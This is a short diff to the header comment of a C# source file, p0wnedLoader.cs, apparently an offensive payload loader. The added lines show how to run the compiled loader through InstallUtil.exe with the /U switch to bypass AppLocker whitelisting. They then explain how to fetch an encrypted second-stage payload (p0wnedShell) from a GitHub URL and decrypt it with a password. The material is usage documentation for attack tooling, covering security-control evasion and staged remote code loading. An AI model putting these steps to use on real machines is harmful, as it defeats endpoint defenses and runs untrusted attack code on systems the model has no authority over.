@@ -15,6 +15,19 @@ Compile as x64:
 cd \Windows\Microsoft.NET\Framework64\v4.0.30319
 csc.exe  /out:"C:\Utils\p0wnedLoaderx64.exe" /platform:x64 "C:\Utils\p0wnedLoader.cs"
 
+To run as x86 binary and bypass Applocker:
+cd \Windows\Microsoft.NET\Framework\v4.0.30319
+InstallUtil.exe /logfile= /LogToConsole=false /U C:\Utils\p0wnedLoaderX86.exe
+
+To run as x64 binary and bypass Applocker:
+cd \Windows\Microsoft.NET\Framework64\v4.0.30319
+InstallUtil.exe /logfile= /LogToConsole=false /U C:\Utils\p0wnedLoaderX64.exe
+
+Usage:
+Just run the Executable (x86 or x64) or use the InstallUtil trick.
+Enter url of our Encrypted Candy e.g: https://github.com/Cn33liz/p0wnedLoader/raw/master/p0wnedShellx64.enc <for x64 version>
+Then after loading Stage2, enter your decryption password.
+
 */
 
 using System;
